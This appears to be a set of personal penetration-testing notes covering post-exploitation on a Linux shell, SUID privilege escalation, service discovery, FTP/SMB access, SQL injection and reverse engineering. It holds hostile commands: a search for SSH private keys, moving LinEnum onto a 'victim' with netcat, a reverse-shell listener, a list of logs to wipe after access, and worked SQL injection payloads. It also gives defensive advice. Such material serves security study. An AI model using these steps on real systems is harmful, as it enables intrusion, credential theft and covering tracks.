# Techniques used by cyber hackers

This is some knowledge related to what attackers are doing once they have access to a remote shell. The first goal is to access root/administrator privileges, which is called **privilege escalation**. Then, a hacker will try to access private data (credential), and other services (database...).

<hr class="sl">

## List of steps

This is just random notes for now, feel free to improve it.

<details class="details-e mt-4">
<summary>Step 1: bash</summary>

* `echo $0`: see the language of the shell
* `bash`: use bash
* `python -c 'import pty; pty.spawn("/bin/bash")'`: use bash (if bash isn't available)
</details>

<details class="details-e">
<summary>Step 2: Find which user you are using</summary>

* `whoami`: username
* `id`: username, group...
</details>

<details class="details-e">
<summary>Step: Identify the machine</summary>

* `cat /etc/*release`: see OS info
* `uname -a`: see machine info
* Look for process that may be vulnerable
* Try to exploit backup scripts (ex: crontab)
* Try to find folders/files which exploitable permissions
</details>

<details class="details-e">
<summary>Step: Look for data</summary>

* `find / -name id_rsa 2> /dev/null`: rsa credentials
* Look for saves/backups
* Look for private files/passwords
</details>

<details class="details-e">
<summary>Step 😎: use LinEnum</summary>

[LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) ([LineEnum GitHub](https://github.com/rebootuser/LinEnum/)) is a script doing most of the check mentioned above, and many more. You need to add it on the victim computer,

* Try wget
* Try a text editor (ex: nano), and copy+paste
* Try FTP
* Try using nc/netcat (victim: `nc -l -p port > LinEnum.sh`, attacker: `nc IP 1337 < LinEnum.sh`)

Then simply do `chmod +x LinEnum.sh`, and `./LinEnum.sh`.
</details>

<details class="details-e">
<summary>Step cleanup</summary>

* `/var/log/auth.log`: ssh logs
* `/var/log/syslog`: firewall logs
* `/var/log/service`: "service" logs (ex: apache)
</details>

<hr class="sl">

## SUID exploits

SUID is a permission that make created by user, executed with the permissions of its creator. It means that a script created by root, will be having root privilege when being executed.

You should first find a vulnerable command,

```bash
$ find / -perm -u=s -type f 2>/dev/null
```

Then try to exploit it. The website [GTFOBins
](https://gtfobins.github.io/) is listing a lot of knowledge about what you can do with a lot of commands.

<hr class="sep-both">

# Server Security

A list of sever-related attacks, along tips, or any related knowledge. There us some knowledge about discovering entrypoint (open ports using nmap), hidden files, and knowledge related to some services such as FTP.

<hr class="sl">

## Discovery of hidden entrypoint

![Level: Novice](https://img.shields.io/badge/level-Novice-7cfc00)

You may want to find what services a server is providing, such as webserver, telnet, SSH, FTP, and so on, as you may attack one of them. Each service is associated with a port on the machine

* **HTTP**: 80
* **FTP**: 21 (remote file system)
* **SSH / SFTP**: 22 (remote shell)
* **SMTP**: 25 (mails)
* **HTTPS**: 443
* **Node**: usually 3000
* ...

There is a more complete [list of vulnerable ports here](). Usually, default port are changed, and sometimes they add a firewall (OVH firewall, [pfsense](https://www.pfsense.org/)... Allowing only some IP to use this port...), along with some tools ([Snort](https://www.snort.org/), [Suricata](https://suricata.io/)...) to detect tentative of mapping the ports of the server.

* <i class="bi bi-info-square" style="background:#7cfc00"></i> Use `nmap` to map the ports of the server

<hr class="sr">

## Discovery of hidden content

![Level: Novice-Intermediate](https://img.shields.io/badge/level-Novice%20Intermediate-ffd700)

* <i class="bi bi-info-square" style="background:#7cfc00"></i> There are cases when the request is in the URL, such as "/account/5123" or "/invoices?ref=365230". Every website should ensure that no unauthorized user can access private data.
* <i class="bi bi-info-square" style="background:#ffd700"></i> use `wfuzz` (or any similar tool) to automate the process above
* <i class="bi bi-info-square" style="background:#ffd700"></i> use `Gobuster` (or any similar tool) with a list of directories (see bruteforce) to search for hidden directories

<hr class="sl">

## File upload

![Level: Novice-Intermediate](https://img.shields.io/badge/level-Novice%20Intermediate-ffd700)

A user may upload a file on a server such as an avatar. You must prevent users from uploading malicious files (ex : scripts), AND prevent users from accessing content belonging to other users (if they shouldn't).

* <i class="bi bi-info-square" style="background:#7cfc00"></i> Secure filters for uploaded files
    * ❌ DO NOT use some stupid filter allowing "xxx.png.php"
    * ❌ DO NOT use /upload /images /media /resources /tmp for user (non-public) files, and better, do not allow access to non-public files via URL <small>(or at least, use a "deny all, allow xxx" kind of .htaccess)</small>. Usually, instead of matching a folder (ex: "www") with the server root <small>(ex: "localhost/")</small>, we are matching it with a sub-folder <small>(ex: www/public)</small>, so that we can use a folder such as "www/uploads" not available via URL <small>(you can't do "localhost/../uploads" in a URL)</small>.
    * ❌ DO NOT trust "content-type"
    * ❌ USE secure functions/ways to get the name of the uploaded file. Hackers can try to bypass them, like by using ASCII characters, or stuff like that.

If an attacker manage to upload a PHP script on the server, they will most likely try to do **reverse engineering**, meaning using a command such as `sudo nc -lvnp 443`, and accessing a remote shell on your server <small>(443 = HTTPS, so you go "unnoticed")</small>.

<hr class="sr">

## Transfer files using FTP (21)

![Level: Novice](https://img.shields.io/badge/level-Novice-7cfc00)

FTP (File Transfer protocol) is a protocol used to transfer (upload, download) files from one computer to another. The protocol use **port 21** by default <small>(22 for SFTP=Secure FTP)</small>, while data is transferred via port 20.

```bash
$ ftp <ip>
# ls <folder>: list files of <folder>
# cd <folder>: move to <folder>
# put <src> <dest>: put <src> (local) to <dest> (server)
# get <src> <dest>: get <src> (server), and save it to <dest> (local)
```

* <i class="bi bi-info-square" style="background:#7cfc00"></i> There is a user: `anonymous/no password`, that usually is disabled, or enabled with limited privileges. If a user anonymous can upload script, they will be upload with unrestrained privileges, allowing anyone executing the script to have fun to their heart's content.

<hr class="sl">

## Transfer files using SMB/NFS

![Level: Intermediate](https://img.shields.io/badge/level-Advanced-fae7b5)

* [THM Kenobi](https://tryhackme.com/room/kenobi)

SMB (Windows), and NFS (Linux), are mostly used internally to share files, instead of FTP which is mostly used externally. There is a tool called [Samba](https://www.samba.org/) that is making both systems using SMB, and NFS working together. Every device (printer, computers...) of a company make be linked via a folder `share`.

```bash
$ smbclient //IP/share_name
# ls <folder>: list files of <folder>
# cd <folder>: move to <folder>
# put <src> <dest>: put <src> (local) to <dest> (server)
# get <src> <dest>: get <src> (server), and save it to <dest> (local)
# pwd: get the path of the working directory

# download every file of a share
$ smbget -R  smb://IP/share_name
```

* <i class="bi bi-info-square" style="background:#7cfc00"></i> Try connecting without password
* <i class="bi bi-info-square" style="background:#7cfc00"></i> Attempt to list shares using nmap `nmap -p 445 –script=smb-enum-shares.nse,smb-enum-users.nse ip`

<hr class="sep-both">

# Database Security

This is a list of attacks that are usually done either on a database, albeit they may be started from another services such as an API, or a website. The main entry, is as one could expect, SQL injections.

<hr class="sl">

## SQL injections

![Level: Novice-Intermediate](https://img.shields.io/badge/level-Novice%20Intermediate-ffd700)

SQL injections means for someone to insert some SQL code inside a SQL query. For instance, if a user have a query taking a username, then the user may submit a SQL query rather than his username.

* <i class="bi bi-shield-check text-success"></i> Use prepared requests (or queries), they are ensuring that parameters of your queries are not interpreted as SQL code
* <i class="bi bi-shield-minus text-danger"></i> You can filter input, but you CAN'T rely on it, as you filter will _most likely_ be bypassed
* <i class="bi bi-shield-minus text-danger"></i> **YOU SHOULD NEVER TRUST DATA FROM THE USER** <small>(actually, don't trust anyone)</small>. SQL injections may be delayed. You may do protect your login queries, but if the username is some SQL code, then any other request using the username may interpret it, hence you should secure **every** request.

<details class="details-e">
<summary>Basics of SQL injection</summary>

Let's say someone submitted this request, trying to login without password to the account 'admin'.

```http request
POST /login.php username="admin' --"&password='nopassword'
```

And in the PHP code, we got a super-stupid-and-lazy-not-prepared SQL request like this <small>(assuming that the password is not encrypted in the Database)</small>.

```php
$sql = "Select * from users where user='$username' AND password='$password'";
```

Then, the SQL request will be as follow. This is because the user used a quote (`'`), which closed the input, allowing him to write his own code. As you should notice, the check for the password is bypassed, and the request will return the record for the user "admin".

```sql
Select * from users where user='admin' --' AND password='nopassword';
```
</details>

<table class="table table-bordered table-striped border-dark"><thead>
<tr><th>Name</th><th>Description</th></tr>
</thead><tbody>

<tr><td>Error-based</td><td>Use an error message when the query failed to adapt the payload, and get data from the database.
</td></tr>

<tr><td>Union-based</td><td>An attacker use something providing results to add records fetched illegally (ex: list of usernames/passwords/...).
</td></tr>

<tr><td>Boolean-based</td><td>This attack is used when there is no errors. An attacker will try to make a request that fail if a boolean expression is false. By doing so, if the service (ex: login) failed, the attacker can inter that is was because the boolean expression was false.
</td></tr>

<tr><td>Others</td><td>Time-based, Out-of-band-based, Voice-based, and Stacked queries-based.
</td></tr>

</tbody></table>


A hacker that detected a possible way to inject some SQL (delayed or not), in a POST or even a GET form, may use it to map, steal, and/or maybe destroy your database.

* <i class="bi bi-info-square" style="background:#7cfc00"></i> Be familiar with the [SQL Injection Payload List repository](https://github.com/payloadbox/sql-injection-payload-list)
* <i class="bi bi-info-square" style="background:#ffd700"></i> You can manually try to map the Database
* <i class="bi bi-info-square" style="background:#ffd700"></i> You can use **SQLMap** to map a Database

<details class="details-e">
<summary>Manually map the database</summary><br>

<details class="details-e">
<summary>Database, version, and user</summary>

You need to find the kind of database, the version, the username, the table and its columns, then steal everything.

* `SELECT @@version`: return the database version
* `SELECT database()`: return the name of the database
* `SELECT user()`: return the name of the database

Some boolean-based SQL injections:

* **For any text**: `' AND (ascii(substr((select database()),1,1))) = 115 --`: return true if the first character of the name of the database is "s" (ascii('s') is 115).
</details>

<details class="details-e">
<summary>Map columns</summary>

**Goal**: To guess the number of columns in the SELECT, which is useful later to use UNION, to fetch data from the database.

One way is using **ORDER BY**: the clause can take a column name that is inside the select, **but the clause can also take the index of the column in the select**. Try injecting `ORDER BY 1`, `ORDER BY 2`, etc., until the query fails.

Another way is using UNION. As you may know, UNION can only be used when the two queries have the same number of columns in the select. Hence, you can try `UNION Select NULL--`, `UNION SELECT NULL, NULL--`, etc., until the query fails.

</details>

<details class="details-e">
<summary>Fetch records</summary>

If you have a SQL injection possible in a page displaying every username given a country, with by the following SQL query

```php
$sql = "SELECT username FROM users WHERE country='$country'";
```

Then, using UNION, you could add another request which will append the results of the second request in the view of the first request <small>(**note**: UNION requires the same number of columns in every SELECT)</small>

```sql
-- inject $country with "' UNION SELECT TABLE_NAME FROM information_schema.TABLES"
SELECT username FROM users WHERE country=''
UNION
SELECT TABLE_NAME FROM information_schema.TABLES
```
</details>
</details>

<hr class="sep-both">

# Reverse Engineering

Try to analyse, and exploit programs by accessing the underlying code, which can help finding database credential, or stuff like that. Any program is converted to a binary (language machine) via the compiler. The goal of Reverse Engineering is to find the code that generated this binary file.

<hr class="sl">

## Assembly

![Level: Intermediate](https://img.shields.io/badge/level-Advanced-fae7b5)

One level above binary (010010...), we have a language called assembly which is basically written in instructions specific to a set of machines (Intel, ARM...). You need to use the appropriate tool according to the kind of application.

* <i class="bi bi-info-square" style="background:#fae7b5"></i> Use `radare2` to convert a binary in an assembly
* <i class="bi bi-info-square" style="background:#fae7b5"></i> Use `ILSpy`/`dotPeek` ❤️ to decompile .NET applications